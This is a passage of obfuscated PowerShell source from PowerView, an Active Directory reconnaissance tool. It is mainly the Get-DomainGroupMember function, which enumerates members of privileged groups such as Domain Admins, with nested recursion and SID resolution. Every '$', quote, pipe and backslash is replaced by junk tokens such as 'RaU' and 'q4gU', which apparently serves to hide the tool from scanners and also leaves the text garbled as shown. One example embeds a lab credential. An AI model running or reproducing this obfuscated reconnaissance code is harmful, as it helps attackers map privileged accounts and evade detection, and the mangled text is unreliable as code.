            RaUManagedGroup = New-Object PSObject
            RaUManagedGroup wZ5t Add-Member Noteproperty q4gUGroupNameq4gU RaU_.samaccountname
            RaUManagedGroup wZ5t Add-Member Noteproperty q4gUGroupDistinguishedNameq4gU RaU_.distinguishedname
            RaUManagedGroup wZ5t Add-Member Noteproperty q4gUManagerNameq4gU RaUGroupManager.samaccountname
            RaUManagedGroup wZ5t Add-Member Noteproperty q4gUManagerDistinguishedNameq4gU RaUGroupManager.distinguishedName

            # determine whether the manager is a user or a group
            if (RaUGroupManager.samaccounttype -eq 0x10000000) {
                RaUManagedGroup wZ5t Add-Member Noteproperty q4gUManagerTypeq4gU q4gUGroupq4gU
            }
            elseif (RaUGroupManager.samaccounttype -eq 0x30000000) {
                RaUManagedGroup wZ5t Add-Member Noteproperty q4gUManagerTypeq4gU q4gUUserq4gU
            }

            RaUACLArguments = @{
                q4gUIdentityq4gU = RaU_.distinguishedname
                q4gURightsFilterq4gU = q4gUWriteMembersq4gU
            }
            if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUACLArguments[q4gUServerq4gU] = RaUServer }
            if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUACLArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
            if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUACLArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
            if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUACLArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
            if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUACLArguments[q4gUTombstoneq4gU] = RaUTombstone }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUACLArguments[q4gUCredentialq4gU] = RaUCredential }

            # # TODO: correct!
            # # find the ACLs that relate to the ability to write to the group
            # RaUxacl = Get-DomainObjectAcl @ACLArguments -Verbose
            # # RaUACLArguments
            # # double-check that the manager
            # if (RaUxacl.ObjectType -eq q4gUbf9679c0-0de6-11d0-a285-00aa003049e2q4gU -and RaUxacl.AceType -eq q4gUAccessAllowedq4gU -and (RaUxacl.ObjectSid -eq RaUGroupManager.objectsid)) {
            #     RaUManagedGroup wZ5t Add-Member Noteproperty q4gUManagerCanWriteq4gU RaUTrue
            # }
            # else {
            #     RaUManagedGroup wZ5t Add-Member Noteproperty q4gUManagerCanWriteq4gU RaUFalse
            # }

            RaUManagedGroup wZ5t Add-Member Noteproperty q4gUManagerCanWriteq4gU q4gUUNKNOWNq4gU

            RaUManagedGroup.PSObject.TypeNames.Insert(0, q4gUPowerView.ManagedSecurityGroupq4gU)
            RaUManagedGroup
        }
    }
}


function Get-DomainGroupMember {
<#
.SYNOPSIS

Return the members of a specific domain group.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGroup, Get-DomainGroupMember, Convert-ADName, Get-DomainObject, ConvertFrom-SID  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for the specified
group matching the criteria. Each result is then rebound and the full user
or group object is returned.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Recurse

Switch. If the group member is a group, recursively try to query its members as well.

.PARAMETER RecurseUsingMatchingRule

Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query to recurse.
Much faster than manual recursion, but doesnq4gUt reveal cross-domain groups,
and only returns user accounts (no nested group objects themselves).

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGroupMember Oj8XDesktop AdminsOj8X

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

q4gUDesktop Adminsq4gU wZ5t Get-DomainGroupMember -Recurse

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Testing Group
GroupDistinguishedName  : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroupMember -Domain testlab.local -Identity q4gUDesktop Adminsq4gU -RecurseUingMatchingRule

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroup *admin* -Properties samaccountname wZ5t Get-DomainGroupMember

.EXAMPLE

q4gUCN=Enterprise Admins,CN=Users,DC=testlab,DC=localq4gU, q4gUDomain Adminsq4gU wZ5t Get-DomainGroupMember

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainGroupMember -Credential RaUCred -Identity q4gUDomain Adminsq4gU

.EXAMPLE

Get-Domain wZ5t Select-Object -Expand name
testlab.local

q4gUdevScKjdomain adminsq4gU wZ5t Get-DomainGroupMember -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Extracted domain q4gUdev.testlab.localq4gU from q4gUdevScKjdomain adminsq4gU
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(wZ5t(samAccountName=domain admins)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(wZ5t(distinguishedname=CN=user1,CN=Users,DC=dev,DC=testlab,DC=local)))

GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : user1
MemberDistinguishedName : CN=user1,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-201108

VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(wZ5t(distinguishedname=CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local)))
GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-500

.OUTPUTS

PowerView.GroupMember

Custom PSObject with translated group member property fields.

.LINK

http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.GroupMemberq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUNoneq4gU)]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU, q4gUMemberDistinguishedNameq4gU, q4gUMemberNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [Parameter(ParameterSetName = q4gUManualRecurseq4gU)]
        [Switch]
        RaURecurse,

        [Parameter(ParameterSetName = q4gURecurseUsingMatchingRuleq4gU)]
        [Switch]
        RaURecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUmember,samaccountname,distinguishednameq4gU
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUSearcherArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUADNameArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUADNameArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUADNameArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUADNameArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        RaUGroupSearcher = Get-DomainSearcher @SearcherArguments
        if (RaUGroupSearcher) {
            if (RaUPSBoundParameters[q4gURecurseUsingMatchingRuleq4gU]) {
                RaUSearcherArguments[q4gUIdentityq4gU] = RaUIdentity
                RaUSearcherArguments[q4gURawq4gU] = RaUTrue
                RaUGroup = Get-DomainGroup @SearcherArguments

                if (-not RaUGroup) {
                    Write-Warning Oj8X[Get-DomainGroupMember] Error searching for group with identity: RaUIdentityOj8X
                }
                else {
                    RaUGroupFoundName = RaUGroup.properties.item(q4gUsamaccountnameq4gU)[0]
                    RaUGroupFoundDN = RaUGroup.properties.item(q4gUdistinguishednameq4gU)[0]

                    if (RaUPSBoundParameters[q4gUDomainq4gU]) {
                        RaUGroupFoundDomain = RaUDomain
                    }
                    else {
                        # if a domain isnq4gUt passed, try to extract it from the found group distinguished name
                        if (RaUGroupFoundDN) {
                            RaUGroupFoundDomain = RaUGroupFoundDN.SubString(RaUGroupFoundDN.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        }
                    }
                    Write-Verbose Oj8X[Get-DomainGroupMember] Using LDAP matching rule to recurse on q4gURaUGroupFoundDNq4gU, only user accounts will be returned.Oj8X
                    RaUGroupSearcher.filter = Oj8X(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=RaUGroupFoundDN))Oj8X
                    RaUGroupSearcher.PropertiesToLoad.AddRange((q4gUdistinguishedNameq4gU))
                    RaUMembers = RaUGroupSearcher.FindAll() wZ5t ForEach-Object {RaU_.Properties.distinguishedname[0]}
                }
                RaUNull = RaUSearcherArguments.Remove(q4gURawq4gU)
            }
            else {
                RaUIdentityFilter = q4gUq4gU
                RaUFilter = q4gUq4gU
                RaUIdentity wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                    RaUIdentityInstance = RaU_.Replace(q4gU(q4gU, q4gUScKj28q4gU).Replace(q4gU)q4gU, q4gUScKj29q4gU)
                    if (RaUIdentityInstance -match q4gU^S-1-q4gU) {
                        RaUIdentityFilter += Oj8X(objectsid=RaUIdentityInstance)Oj8X
                    }
                    elseif (RaUIdentityInstance -match q4gU^CN=q4gU) {
                        RaUIdentityFilter += Oj8X(distinguishedname=RaUIdentityInstance)Oj8X
                        if ((-not RaUPSBoundParameters[q4gUDomainq4gU]) -and (-not RaUPSBoundParameters[q4gUSearchBaseq4gU])) {
                            # if a -Domain isnq4gUt explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            RaUIdentityDomain = RaUIdentityInstance.SubString(RaUIdentityInstance.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                            Write-Verbose Oj8X[Get-DomainGroupMember] Extracted domain q4gURaUIdentityDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                            RaUSearcherArguments[q4gUDomainq4gU] = RaUIdentityDomain
                            RaUGroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not RaUGroupSearcher) {
                                Write-Warning Oj8X[Get-DomainGroupMember] Unable to retrieve domain searcher for q4gURaUIdentityDomainq4gUOj8X
                            }
                        }
                    }
                    elseif (RaUIdentityInstance -imatch q4gU^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}RaUq4gU) {
                        RaUGuidByteString = (([Guid]RaUIdentityInstance).ToByteArray() wZ5t ForEach-Object { q4gUScKjq4gU + RaU_.ToString(q4gUX2q4gU) }) -join q4gUq4gU
                        RaUIdentityFilter += Oj8X(objectguid=RaUGuidByteString)Oj8X
                    }
                    elseif (RaUIdentityInstance.Contains(q4gUScKjq4gU)) {
                        RaUConvertedIdentityInstance = RaUIdentityInstance.Replace(q4gUScKj28q4gU, q4gU(q4gU).Replace(q4gUScKj29q4gU, q4gU)q4gU) wZ5t Convert-ADName -OutputType Canonical
                        if (RaUConvertedIdentityInstance) {
                            RaUGroupDomain = RaUConvertedIdentityInstance.SubString(0, RaUConvertedIdentityInstance.IndexOf(q4gU/q4gU))
                            RaUGroupName = RaUIdentityInstance.Split(q4gUScKjq4gU)[1]
                            RaUIdentityFilter += Oj8X(samAccountName=RaUGroupName)Oj8X
                            RaUSearcherArguments[q4gUDomainq4gU] = RaUGroupDomain
                            Write-Verbose Oj8X[Get-DomainGroupMember] Extracted domain q4gURaUGroupDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                            RaUGroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        RaUIdentityFilter += Oj8X(samAccountName=RaUIdentityInstance)Oj8X
                    }
                }

                if (RaUIdentityFilter -and (RaUIdentityFilter.Trim() -ne q4gUq4gU) ) {
                    RaUFilter += Oj8X(wZ5tRaUIdentityFilter)Oj8X
                }

                if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
                    Write-Verbose Oj8X[Get-DomainGroupMember] Using additional LDAP filter: RaULDAPFilterOj8X
                    RaUFilter += Oj8XRaULDAPFilterOj8X
                }

                RaUGroupSearcher.filter = Oj8X(&(objectCategory=group)RaUFilter)Oj8X
                Write-Verbose Oj8X[Get-DomainGroupMember] Get-DomainGroupMember filter string: RaU(RaUGroupSearcher.filter)Oj8X
                try {
                    RaUResult = RaUGroupSearcher.FindOne()
                }
                catch {
                    Write-Warning Oj8X[Get-DomainGroupMember] Error searching for group with identity q4gURaUIdentityq4gU: RaU_Oj8X
                    RaUMembers = @()
                }

                RaUGroupFoundName = q4gUq4gU
                RaUGroupFoundDN = q4gUq4gU

                if (RaUResult) {
                    RaUMembers = RaUResult.properties.item(q4gUmemberq4gU)

                    if (RaUMembers.count -eq 0) {
                        # ranged searching, thanks @meatballs__ !
                        RaUFinished = RaUFalse
                        RaUBottom = 0
                        RaUTop = 0

                        while (-not RaUFinished) {
                            RaUTop = RaUBottom + 1499
                            RaUMemberRange=Oj8Xmember;range=RaUBottom-RaUTopOj8X
                            RaUBottom += 1500
                            RaUNull = RaUGroupSearcher.PropertiesToLoad.Clear()
                            RaUNull = RaUGroupSearcher.PropertiesToLoad.Add(Oj8XRaUMemberRangeOj8X)
                            RaUNull = RaUGroupSearcher.PropertiesToLoad.Add(q4gUsamaccountnameq4gU)
                            RaUNull = RaUGroupSearcher.PropertiesToLoad.Add(q4gUdistinguishednameq4gU)

                            try {
                                RaUResult = RaUGroupSearcher.FindOne()
                                RaURangedProperty = RaUResult.Properties.PropertyNames -like Oj8Xmember;range=*Oj8X
                                RaUMembers += RaUResult.Properties.item(RaURangedProperty)
                                RaUGroupFoundName = RaUResult.properties.item(q4gUsamaccountnameq4gU)[0]
                                RaUGroupFoundDN = RaUResult.properties.item(q4gUdistinguishednameq4gU)[0]

                                if (RaUMembers.count -eq 0) {
                                    RaUFinished = RaUTrue
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                RaUFinished = RaUTrue
                            }
                        }
                    }
                    else {
                        RaUGroupFoundName = RaUResult.properties.item(q4gUsamaccountnameq4gU)[0]
                        RaUGroupFoundDN = RaUResult.properties.item(q4gUdistinguishednameq4gU)[0]
                        RaUMembers += RaUResult.Properties.item(RaURangedProperty)
                    }

                    if (RaUPSBoundParameters[q4gUDomainq4gU]) {
                        RaUGroupFoundDomain = RaUDomain
                    }
                    else {
                        # if a domain isnq4gUt passed, try to extract it from the found group distinguished name
                        if (RaUGroupFoundDN) {
                            RaUGroupFoundDomain = RaUGroupFoundDN.SubString(RaUGroupFoundDN.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        }
                    }
                }
            }

            ForEach (RaUMember in RaUMembers) {
                if (RaURecurse -and RaUUseMatchingRule) {
                    RaUProperties = RaU_.Properties
                }
                else {
                    RaUObjectSearcherArguments = RaUSearcherArguments.Clone()
                    RaUObjectSearcherArguments[q4gUIdentityq4gU] = RaUMember
                    RaUObjectSearcherArguments[q4gURawq4gU] = RaUTrue
                    RaUObjectSearcherArguments[q4gUPropertiesq4gU] = q4gUdistinguishedname,cn,samaccountname,objectsid,objectclassq4gU
                    RaUObject = Get-DomainObject @ObjectSearcherArguments
                    RaUProperties = RaUObject.Properties
                }

                if (RaUProperties) {
                    RaUGroupMember = New-Object PSObject
                    RaUGroupMember wZ5t Add-Member Noteproperty q4gUGroupDomainq4gU RaUGroupFoundDomain
                    RaUGroupMember wZ5t Add-Member Noteproperty q4gUGroupNameq4gU RaUGroupFoundName
                    RaUGroupMember wZ5t Add-Member Noteproperty q4gUGroupDistinguishedNameq4gU RaUGroupFoundDN

                    if (RaUProperties.objectsid) {
                        RaUMemberSID = ((New-Object System.Security.Principal.SecurityIdentifier RaUProperties.objectsid[0], 0).Value)
                    }
                    else {
                        RaUMemberSID = RaUNull
                    }

                    try {
                        RaUMemberDN = RaUProperties.distinguishedname[0]
                        if (RaUMemberDN -match q4gUForeignSecurityPrincipalswZ5tS-1-5-21q4gU) {
                            try {
                                if (-not RaUMemberSID) {
                                    RaUMemberSID = RaUProperties.cn[0]
                                }
                                RaUMemberSimpleName = Convert-ADName -Identity RaUMemberSID -OutputType q4gUDomainSimpleq4gU @ADNameArguments

                                if (RaUMemberSimpleName) {
                                    RaUMemberDomain = RaUMemberSimpleName.Split(q4gU@q4gU)[1]
                                }
                                else {
                                    Write-Warning Oj8X[Get-DomainGroupMember] Error converting RaUMemberDNOj8X
                                    RaUMemberDomain = RaUNull
                                }
                            }
                            catch {
                                Write-Warning Oj8X[Get-DomainGroupMember] Error converting RaUMemberDNOj8X
                                RaUMemberDomain = RaUNull
                            }
                        }
                        else {
                            # extract the FQDN from the Distinguished Name
                            RaUMemberDomain = RaUMemberDN.SubString(RaUMemberDN.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        }
                    }
                    catch {
                        RaUMemberDN = RaUNull
                        RaUMemberDomain = RaUNull
                    }

                    if (RaUProperties.samaccountname) {
                        # forest users have the samAccountName set
                        RaUMemberName = RaUProperties.samaccountname[0]
                    }
                    else {
                        # external trust users have a SID, so convert it
                        try {
                            RaUMemberName = ConvertFrom-SID -ObjectSID RaUProperties.cn[0] @ADNameArguments
                        }
                        catch {
                            # if thereq4gUs a problem contacting the domain to resolve the SID
                            RaUMemberName = RaUProperties.cn[0]
                        }
                    }

                    if (RaUProperties.objectclass -match q4gUcomputerq4gU) {
                        RaUMemberObjectClass = q4gUcomputerq4gU
                    }
                    elseif (RaUProperties.objectclass -match q4gUgroupq4gU) {
                        RaUMemberObjectClass = q4gUgroupq4gU
                    }
                    elseif (RaUProperties.objectclass -match q4gUuserq4gU) {
                        RaUMemberObjectClass = q4gUuserq4gU
                    }
                    else {
                        RaUMemberObjectClass = RaUNull
                    }
                    RaUGroupMember wZ5t Add-Member Noteproperty q4gUMemberDomainq4gU RaUMemberDomain
                    RaUGroupMember wZ5t Add-Member Noteproperty q4gUMemberNameq4gU RaUMemberName
                    RaUGroupMember wZ5t Add-Member Noteproperty q4gUMemberDistinguishedNameq4gU RaUMemberDN
                    RaUGroupMember wZ5t Add-Member Noteproperty q4gUMemberObjectClassq4gU RaUMemberObjectClass
                    RaUGroupMember wZ5t Add-Member Noteproperty q4gUMemberSIDq4gU RaUMemberSID
                    RaUGroupMember.PSObject.TypeNames.Insert(0, q4gUPowerView.GroupMemberq4gU)
                    RaUGroupMember

                    # if weq4gUre doing manual recursion
                    if (RaUPSBoundParameters[q4gURecurseq4gU] -and RaUMemberDN -and (RaUMemberObjectClass -match q4gUgroupq4gU)) {
                        Write-Verbose Oj8X[Get-DomainGroupMember] Manually recursing on group: RaUMemberDNOj8X
                        RaUSearcherArguments[q4gUIdentityq4gU] = RaUMemberDN
                        RaUNull = RaUSearcherArguments.Remove(q4gUPropertiesq4gU)
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            RaUGroupSearcher.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {
<#
.SYNOPSIS

Returns information on group members that were removed from the specified
group identity. Accomplished by searching the linked attribute replication
metadata for the group using Get-DomainObjectLinkedAttributeHistory.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObjectLinkedAttributeHistory

.DESCRIPTION

Wraps Get-DomainObjectLinkedAttributeHistory to return the linked attribute
replication metadata for the specified group. These are cases where the
q4gUVersionq4gU attribute of group member in the replication metadata is even.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGroupMemberDeleted wZ5t Group-Object GroupDN

Count Name                      Group
----- ----                      -----
    2 CN=Domain Admins,CN=Us... {@{GroupDN=CN=Domain Admins,CN=Users,DC=test...
    3 CN=DomainLocalGroup,CN... {@{GroupDN=CN=DomainLocalGroup,CN=Users,DC=t...

.EXAMPLE

Get-DomainGroupMemberDeleted Oj8XDomain AdminsOj8X -Domain testlab.local


GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
MemberDN              : CN=testuser,CN=Users,DC=testlab,DC=local
TimeFirstAdded        : 2017-06-13T23:07:43Z
TimeDeleted           : 2017-06-13T23:26:17Z
LastOriginatingChange : 2017-06-13T23:26:17Z
TimesAdded            : 2
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
MemberDN              : CN=dfm,CN=Users,DC=testlab,DC=local
TimeFirstAdded        : 2017-06-13T22:20:02Z
TimeDeleted           : 2017-06-13T23:26:17Z
LastOriginatingChange : 2017-06-13T23:26:17Z
TimesAdded            : 5
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.DomainGroupMemberDeleted

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.DomainGroupMemberDeletedq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU, q4gUMemberDistinguishedNameq4gU, q4gUMemberNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

